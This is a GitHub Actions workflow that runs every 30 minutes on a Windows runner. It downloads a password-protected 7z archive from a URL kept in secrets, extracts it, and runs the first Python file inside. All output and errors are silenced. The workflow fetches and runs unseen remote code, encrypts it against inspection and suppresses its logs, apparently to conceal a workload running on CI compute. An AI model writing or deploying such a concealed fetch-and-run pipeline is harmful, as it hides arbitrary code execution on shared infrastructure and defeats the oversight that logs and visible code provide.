name: Worker

on:
  workflow_dispatch:
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: worker
  cancel-in-progress: true

jobs:
  worker:
    runs-on: windows-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v3

      - name: Install
        shell: powershell
        run: |
          choco install 7zip -y --no-progress > $null

      - name: Download
        shell: powershell
        env:
          SRC_URL: ${{ secrets.LINK }}
        run: |
          $ProgressPreference = "SilentlyContinue"
          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null

      - name: Extract
        shell: powershell
        env:
          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
        run: |
          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null

      - name: Execute
        shell: powershell
        run: |
          $ErrorActionPreference = "SilentlyContinue"

          if (-not (Test-Path "extracted")) { exit 1 }

          $root = Resolve-Path "extracted"
          $env:PYTHONPATH = $root

          $entry = Get-ChildItem $root -Recurse -File -Filter *.py |
                   Sort-Object FullName |
                   Select-Object -First 1

          if (-not $entry) { exit 1 }

          python "$($entry.FullName)" > $null 2>&1
